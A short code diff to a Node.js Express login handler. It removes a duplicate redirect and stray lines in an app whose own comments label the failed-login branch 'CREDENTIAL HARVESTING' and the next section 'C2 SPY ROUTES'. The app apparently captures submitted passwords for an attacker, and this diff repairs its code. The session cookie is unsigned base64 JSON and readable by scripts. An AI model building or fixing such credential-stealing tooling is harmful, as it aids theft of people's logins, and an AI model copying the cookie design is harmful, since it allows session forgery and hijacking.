@@ -81,7 +81,6 @@ app.post('/login', (req, res) => {
             const cookieValue = Buffer.from(JSON.stringify(sessionObj)).toString('base64');
             res.cookie('session_data', cookieValue, { httpOnly: false });
             res.redirect('/dashboard');
-            res.redirect('/dashboard');
         } else {
             // === CREDENTIAL HARVESTING (Перехват паролей) ===
             const time = new Date().toLocaleTimeString();
@@ -96,9 +95,6 @@ app.post('/login', (req, res) => {
             res.render('login', { error: "Invalid username or password" });
         }
     });
-});
-
-res.redirect('/login');
 });
 
 // === C2 SPY ROUTES ===
